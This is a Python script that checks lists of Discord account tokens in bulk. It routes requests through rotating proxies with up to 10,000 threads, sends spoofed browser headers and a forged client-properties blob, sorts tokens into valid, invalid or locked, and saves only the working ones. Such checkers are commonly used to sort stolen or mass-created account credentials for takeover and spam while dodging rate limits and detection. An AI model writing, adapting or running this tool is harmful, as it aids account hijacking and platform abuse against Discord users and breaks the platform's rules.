import requests, itertools, sys, os, datetime, base64, concurrent.futures

class Logging:
    def time():
        return datetime.datetime.now().strftime('%M:%S.%f')[:-3]

    def info(input: str):
        print('\t\x1b[1m\x1b[38;5;33m[\x1b[0m\x1b[1m%s\x1b[38;5;33m]\x1b[0m\x1b[1m %s\x1b[0m' % (Logging.time(), input))

    def error(input: str):
        print('\t\x1b[1m\x1b[38;5;9m[\x1b[0m\x1b[1m%s\x1b[38;5;9m]\x1b[0m\x1b[1m %s\x1b[0m' % (Logging.time(), input))

class Main:
    def __init__(self):
        self.tokens = []
        with open('tokens.txt', 'r') as file:
            for _ in file:
                self.tokens.append(_.strip())
        self.proxies = []
        with open('proxies.txt', 'r') as file:
            for _ in file:
                self.proxies.append(_.strip())
        self.token_pool = itertools.cycle(self.tokens)
        self.proxy_pool = itertools.cycle(self.proxies)
        if sys.platform == 'win32':
            self.cls = lambda: os.system('cls')
        else:
            self.cls = lambda: os.system('clear')

    def get_token(self):
        while True:
            token = next(self.token_pool)
            return token

    def get_proxy(self):
        while True:
            proxy = next(self.proxy_pool)
            return {'https': 'http://%s' % proxy, 'http': 'http://%s' % proxy}

    def get_token_id(self, token):
        try:
            return base64.b64decode(token.split('.')[0].encode()).decode()
        except:
            return '0' * 18

    def get_cookie(self):
        response = requests.Session().get('https://discord.com/app')
        cookie = str(response.cookies)
        return cookie.split('dcfduid=')[1].split(';')[0], cookie.split('sdcfduid=')[1].split(';')[0]

    def create_session(self, token, cookie):
        session = requests.Session()
        session.proxies.update(self.get_proxy())
        session.headers.update({
            'authorization': token,
            'accept': '*/*',
            'accept-encoding': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'cookie': '__dcfduid=%s; __sdcfduid=%s; locale=en-US' % (cookie),
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDMuMC41MDYwLjExNCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAzLjAuNTA2MC4xMTQiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5OTk5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
        })
        return session

    def login(self, token, attempts = 1):
        if attempts == 5:
            return
        try:
            session = self.create_session(token, self.get_cookie())
            response = session.get('https://discord.com/api/v9/users/@me/library')
            if response.status_code == 200:
                Logging.info('Token \x1b[38;5;33m%s\x1b[0m\x1b[1m is \x1b[38;5;33mvalid\x1b[0m\x1b[1m.' % self.get_token_id(token))
                self.checked.append(token)
            elif response.status_code == 401:
                Logging.error('Token \x1b[38;5;9m%s\x1b[0m\x1b[1m is \x1b[38;5;9minvalid\x1b[0m\x1b[1m.' % self.get_token_id(token))
            elif response.status_code == 403:
                Logging.error('Token \x1b[38;5;9m%s\x1b[0m\x1b[1m is \x1b[38;5;9mlocked\x1b[0m\x1b[1m.' % self.get_token_id(token))
            else:
                Logging.error('Unrecognized response: \x1b[38;5;9m%s\x1b[0m\x1b[1m.' % response.json())
        except:
            self.login(token, attempts + 1)

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers = 10000) as executor:
            while True:
                self.cls()
                print('\n\t\x1b[1m\x1b[38;5;33m[\x1b[0m\x1b[1m0\x1b[38;5;33m]\x1b[0m\x1b[1m Remove Bad Tokens')
                option = input('\n\tOption\x1b[38;5;33m:\x1b[0m\x1b[1m ')
                print()
                if option == '0':
                    self.checked = []
                    tasks = [executor.submit(self.login, self.get_token()) for _ in range(len(self.tokens))]
                    for _ in tasks:
                        for task in concurrent.futures.as_completed(tasks):
                            pass
                    if len(self.checked):
                        open('tokens.txt', 'w').close()
                        with open('tokens.txt', 'a') as file:
                            for token in self.checked:
                                file.write('%s\n' % token)
                        print('\n\t\x1b[1mSaved \x1b[38;5;33m%s\x1b[0m\x1b[1m valid tokens.' % len(self.checked))
                        input('\tPress \x1b[38;5;33mEnter\x1b[0m\x1b[1m to continue.')
                    else:
                        print('\n\t\x1b[1mNo valid tokens found.')
                        input('\tPress \x1b[38;5;33mEnter\x1b[0m\x1b[1m to continue.')

if __name__ == '__main__':
    Main().run()